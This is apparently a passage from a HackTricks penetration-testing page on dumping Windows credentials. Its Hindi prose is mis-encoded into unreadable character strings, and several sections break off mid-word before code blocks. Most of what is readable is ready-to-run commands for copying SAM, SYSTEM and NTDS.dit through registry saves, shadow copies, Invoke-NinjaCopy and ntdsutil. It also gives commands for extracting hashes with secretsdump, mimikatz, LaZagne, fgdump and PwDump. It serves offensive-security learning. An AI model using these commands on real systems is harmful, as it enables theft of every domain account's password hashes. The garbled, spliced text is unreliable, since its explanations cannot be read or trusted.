### рдкреНрд░рддреНрдпреЗрдХ NTDS.dit рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП pwdLastSet рд╡рд┐рд╢реЗрд╖рддрд╛ рджрд┐рдЦрд╛рдПрдВ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM рдФрд░ SYSTEM рдЪреБрд░рд╛рдирд╛

рдпреЗ рдлрд╝рд╛рдЗрд▓реЗрдВ **_C:\windows\system32\config\SAM_** рдФрд░ **_C:\windows\system32\config\SYSTEM_** рдореЗрдВ **рд╕реНрдерд┐рдд** рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рд▓реЗрдХрд┐рди **рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕рд╛рдзрд╛рд░рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдкреА рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ** рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВред

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ

рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ рдПрдХ рдХреЙрдкреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИ:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ** рдЕрдкрдиреА Kali рдорд╢реАрди рдкрд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ **рд╣реИрд╢** рдирд┐рдХрд╛рд▓реЗрдВ:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### рд╡реЙрд▓реНрдпреВрдо рд╢реИрдбреЛ рдХреЙрдкреА

рдЖрдк рдЗрд╕ рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

#### vssadmin рдХрд╛ рдЙрдкрдпреЛрдЧ

vssadmin рдмрд╛рдЗрдирд░реА рдХреЗрд╡рд▓ Windows рд╕рд░реНрд╡рд░ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рд╣реА рдЙрдкрд▓рдмреНрдз рд╣реИ
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕реЗ **рдкрд╛рд╡рд░рд╢реЗрд▓** рд╕реЗ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ **рдХрд┐ рдХреИрд╕реЗ SAM рдлрд╝рд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдИ рдЬрд╛рдП** (рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣рд╛рд░реНрдб рдбреНрд░рд╛рдЗрд╡ "C:" рд╣реИ рдФрд░ рдпрд╣ C:\users\Public рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ) рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рд╕рдВрд░рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

рдЕрдВрдд рдореЗрдВ, рдЖрдк [**PS рд╕реНрдХреНрд░рд┐рдкреНрдЯ Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ SAM, SYSTEM рдФрд░ ntds.dit рдХреА рдПрдХ рдХреЙрдкреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ - NTDS.dit**

**NTDS.dit** рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА** рдХрд╛ рд╣реНрд░рджрдп рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕, рд╕рдореВрд╣ рдФрд░ рдЙрдирдХреА рд╕рджрд╕реНрдпрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдбреЗрдЯрд╛ рд╣реЛрддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ **рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢** рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдПрдХ **рдПрдХреНрд╕рдЯреЗрдВрд╕рд┐рдмрд▓ рд╕реНрдЯреЛрд░реЗрдЬ рдЗрдВрдЬрди (ESE)** рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реИ рдФрд░ **_%SystemRoom%/NTDS/ntds.dit_** рдкрд░ рд╕реНрдерд┐рдд рд╣реИред

рдЗрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ, рддреАрди рдкреНрд░рдореБрдЦ рддрд╛рд▓рд┐рдХрд╛рдПрдБ рдмрдирд╛рдП рд░рдЦреА рдЧрдИ рд╣реИрдВ:

- **рдбреЗрдЯрд╛ рддрд╛рд▓рд┐рдХрд╛**: рдЗрд╕ рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдХрд╛рд░реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣ рдЬреИрд╕реЗ рдСрдмреНрдЬ
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
рдЖрдк рдпрд╣рд╛рдБ [**рд╡реЙрд▓реНрдпреВрдо рд╢реИрдбреЛ рдХреЙрдкреА**](./#stealing-sam-and-system) рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **ntds.dit** рдлрд╝рд╛рдЗрд▓ рдХреА рдХреЙрдкреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **SYSTEM рдлрд╝рд╛рдЗрд▓** рдХреА рднреА рдПрдХ рдХреЙрдкреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдлрд┐рд░ рд╕реЗ, [**рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ рдбрдВрдк рдХрд░реЗрдВ рдпрд╛ рд╡реЙрд▓реНрдпреВрдо рд╢реИрдбреЛ рдХреЙрдкреА**](./#stealing-sam-and-system) рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ)ред

### **NTDS.dit рд╕реЗ рд╣реИрд╢ рдирд┐рдХрд╛рд▓рдирд╛**

рдЬрдм рдЖрдкрдиреЗ **NTDS.dit** рдФрд░ **SYSTEM** рдлрд╝рд╛рдЗрд▓реЗрдВ **рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд▓реА рд╣реЛрдВ, рддреЛ рдЖрдк _secretsdump.py_ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реИрд╢ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рднреА **рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** рдПрдХ рдорд╛рдиреНрдп рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**рдмрдбрд╝реЗ NTDS.dit рдлрд╝рд╛рдЗрд▓реЛрдВ** рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ [gosecretsdump](https://github.com/c-sto/gosecretsdump) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдХрд╛рд▓рдирд╛ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЕрдВрдд рдореЗрдВ, рдЖрдк **metasploit рдореЙрдбреНрдпреВрд▓** рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: _post/windows/gather/credentials/domain\_hashdump_ рдпрд╛ **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit рд╕реЗ рдбреЛрдореЗрди рдСрдмреНрдЬ
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` рд╣рд╛рдЗрд╡ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рдЧреБрдкреНрдд рд╕реБрд▓рдЭрд╛рд╡ (рдПрдирдЯреА рдФрд░ рдПрд▓рдПрдо рд╣реИрд╢, рд╕рд╣рд╛рдпрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬреИрд╕реЗ рд╕рд╛рдл-рд╕реБрдерд░реЗ рдкрд╛рд╕рд╡рд░реНрдб, рдХреЗрд░рдмреЗрд░реЛрд╕ рдпрд╛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреБрдВрдЬрд┐рдпрд╛рдБ, рдПрдирдЯреА рдФрд░ рдПрд▓рдПрдо рдкрд╛рд╕рд╡рд░реНрдб рдЗрддрд┐рд╣рд╛рд╕)ред рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдорд╢реАрди рдЦрд╛рддреЗ рдЙрдирдХреЗ рд╣реИрд╢ рдХреЗ рд╕рд╛рде, UAC рдзреНрд╡рдЬ, рдЕрдВрддрд┐рдо рд▓реЙрдЧрдСрди рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рд▓рд┐рдП рд╕рдордпрдЪрд┐рд╣реНрди, рдЦрд╛рддреЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг, рдирд╛рдо, рдпреВрдкреАрдПрди, рдПрд╕рдкреАрдПрди, рд╕рдореВрд╣ рдФрд░ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд╕рджрд╕реНрдпрддрд╛, рд╕рдВрдЧрдардирд╛рддреНрдордХ рдЗрдХрд╛рдЗрдпреЛрдВ рдХрд╛ рдкреЗрдбрд╝ рдФрд░ рд╕рджрд╕реНрдпрддрд╛, рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЛрдореЗрди рдЬрд┐рдирдореЗрдВ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗ рдкреНрд░рдХрд╛рд░, рджрд┐рд╢рд╛ рдФрд░ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╣реИрдВ...

## Lazagne

[рдпрд╣рд╛рдБ рд╕реЗ](https://github.com/AlessandroZ/LaZagne/releases) рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред рдЖрдк рдЗрд╕ рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдИ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
lazagne.exe all
```
## SAM рдФрд░ LSASS рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЙрдкрдХрд░рдг

### Windows credentials Editor (WCE)

рдЗрд╕ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдореЗрдореЛрд░реА рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд┐рдХрд╛рд▓реЗрдВ
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд┐рдХрд╛рд▓реЗрдВ
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) рдФрд░ рдмрд╕ **рдЗрд╕реЗ рдЪрд▓рд╛рдПрдВ** рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓ рд▓рд┐рдП рдЬрд╛рдПрдВрдЧреЗред

## рд░рдХреНрд╖рд╛

[**рдХреБрдЫ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВред**](credentials-protections.md)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **HackTricks** рдФрд░ **HackTricks Cloud** github repos рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
